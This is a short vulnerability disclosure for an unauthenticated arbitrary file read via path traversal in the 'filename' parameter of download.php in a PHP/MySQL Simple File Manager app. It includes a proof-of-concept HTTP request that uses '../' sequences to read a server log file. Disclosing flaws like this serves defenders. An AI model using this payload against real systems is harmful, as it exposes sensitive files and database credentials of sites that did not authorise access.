# Simple File Manager Web App using PHP and MySQL Database Free Source Code - Arbitrary file read vulnerability
+ Author: xuanluansec
# Vendor Homepage
+ https://www.sourcecodester.com/upload-download-and-delete-file-using-php-mysql.html
# Software Link
+ https://www.sourcecodester.com/sites/default/files/download/oretnom23/myfilemgr.zip
# Overview
+ xuanluansec has discovered a vulnerability classified as critical in Simple File Manager Web App using PHP and MySQL Database Free Source Code V1.0. Any file read. This operation will result in unrestricted file reading. Can read sensitive files and database configuration files.
# Vulnerability Details
+ Simple File Manager Web App using PHP and MySQL Database Free Source Code V1.0
+ Vulnerable File: download.php
+ Parameter Names: filename
+ Attack Type: Remote
# Description
+ xuanluansec has discovered a vulnerability classified as critical in Simple File Manager Web App using PHP and MySQL Database Free Source Code V1.0. Any file read. This operation will result in unrestricted file reading. Can read sensitive files and database configuration files.
# Note
+ No need to log in to the website.

# Proof of Concept (PoC) : 

```
GET /download.php?filename=../../../nginx/logs/access.log HTTP/1.1
Host: www.myfilemgr.com:8092
Accept-Encoding: gzip, deflate
Safari/533.20.27
Connection: close


```

![1](https://github.com/xuanluansec/vul/blob/main/vul/img/20.png)
